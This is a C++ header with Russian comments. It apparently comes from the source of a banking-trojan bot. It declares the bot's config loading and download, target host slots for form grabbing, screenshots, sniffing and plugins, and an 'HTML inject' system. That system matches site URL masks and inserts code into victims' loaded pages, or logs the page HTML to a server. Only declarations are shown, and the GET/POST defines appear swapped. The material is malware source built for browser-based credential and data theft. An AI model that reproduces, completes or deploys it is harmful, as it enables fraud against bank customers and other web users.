// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// В дальнейшем планируется разделение инжектов от конфига, нро в
// данный момент включение/отключение HTKL инжектов оставляем в этом модуле
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  Методы для работы с конфигурационным файлом бота
//
//
//  ВАЖНО!!!!!! Некоторые опции конфига доступны только для визуальных
//              приложений
//				добавить имя BV_APP в имена препроцесора
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
    DWORD MacrosHash;  // Хэш данных  для определения макроса инжекта
	bool Disabled;     // Не использовать инжект (Для отладочной программы)
	LPVOID Owner;      // Указатель на инжект владелец данных
	DWORD  ID;         // Ижентификатор, Для внутренних нужд

}*PHTMLInjectData;


//---------------------------------------------------------
//  THTMLInject - описание данных для внедрения своего
//                    HTML кода в загружаемые страницы
//---------------------------------------------------------
typedef struct THTMLInject
{
	PCHAR URL;       // Маска сайта для которого необходимо обрабатывать страницы
	bool GET; 		 // Обрабатывать GET запросы
	bool POST;       // Обрабатывать POST запросы
	bool IsLog;      // Логировать HTML. Вместо подмены отправлять данные на сервер
	PList Injects;   // Список инжектов (список элементов типа PHTMLInject)
	bool Disabled;   // Не использовать инжект (Для отладочной программы)
	bool Used;       // Признак того что маска использовалась
	DWORD RefCount;  // Количество текущих блокировок инжекта
	bool DestroyAfterRelease; // Уничтожить инжект после обнуления счётчика
	DWORD  ID;       // Ижентификатор, Для внутренних нужд
	#ifdef BV_APP
		PCHAR Comment;   // Коментарий к инжекту, только для редактора
	#endif
} *PHTMLInject;


//---------------------------------------------------------
// TBotConfig -  Настройки работы бота
//---------------------------------------------------------
typedef struct TBotConfig
{
	PList HTMLInjects;          // Список инжектов (список элементов типа PHTMLInject)
	RTL_CRITICAL_SECTION Lock;  // Критичиская секция блокировки конфига
	PWCHAR LastConfigFile;      // Имя последнего загруженного файла
	FILETIME ConfigTime;        // Время изменения загруженного файла
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - установить метод обработки
//		событий HTML инжекта
//*********************************************************
// Метод, событие HTML инжекта
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// Данныве с которыми зарегистрировано событие
									LPVOID Sender, 	    	// источник события
									THTMLInjectEventID ID,  // Идентификатор события
									LPVOID Reserver);      	// Зарезервировано

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	// Функция создаёт структуру конфига
	PBotConfig Create();

	// Функция уничтожает структуру конфига
	void Free(PBotConfig Cfg);

	//*********************************************************
	//	Initialize - Инициализировать глобальные
	//  	настройки бота. Если указао имя файла FileName то
	//  	настройки будут прочитаны из него, в противном
	//  	случае настройки будут прочитаны из файла вшитого
	//		в код бота.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// Функция возвращает указатель на конфиг бота
	PBotConfig GetConfig();

	// Очистить конфиг
	void Clear(PBotConfig Config);

	//  Функция возврашает имя файла по умолчанию
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  Функция устанавливает имя файла по умолчанию
	void SetFileName(PWCHAR FileName);

	// Загрузить конфиг
	bool Download(PCHAR URL);

	// Функция возвращает истину если буфер является конфигом
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - Получить инжекты для запроса
	bool GetInjectsForRequest(PRequest Request);

	// Функция проверяет есть ли для указанного адреса инжект
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);

	// Функция загружает конфиг из файла
	bool LoadConfigFromFile(PBotConfig Config, PWCHAR FileName);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - Методы для работы с HTML инжектами
//****************************************************************************
namespace HTMLInjects
{
	//*********************************************************
	// Функция возвращает истину если данные можно использовать
	// в инжектах
	//*********************************************************
	bool IsValidInjectData(PHTMLInjectData Data);


	//*********************************************************
	//  Выполнить HTML инжекты.
	//
	//  Результат - функция возвращает истину если в буффер
	//              запроса были внесены изменения
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  AddInject - Добавить новый HTML инжект в список
	//		List. Если указан источник Source то в новый
	//		будут скопированы все его данные
	//*********************************************************
	PHTMLInject AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);

	//*********************************************************
	//  AddInjectData - Добавить новые данные инжекта
	//                      Добавлять данные инжекта, только
	//						этой функцией
	//*********************************************************
	PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);

	//*********************************************************
	//  ResetStatus - сбросить статус инжектов
	//*********************************************************
	void ResetStatus(PList Injects);

	//*********************************************************
	//  ClearInjectList - Функция очищает список содержащий
	//		 			  элементы типа THTMLInject
	//*********************************************************
	void ClearInjectList(PList List);

	//*********************************************************
	//  Методы уничтожения данных HTML инжекта
	//*********************************************************
	void FreeInject(PHTMLInject Inject);

	//*********************************************************
	// ReleaseInjectsList - Фуекция освобождает список инжектов
	//                      которые были выделены для запроса
	// List - Список выделенных инжектов
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
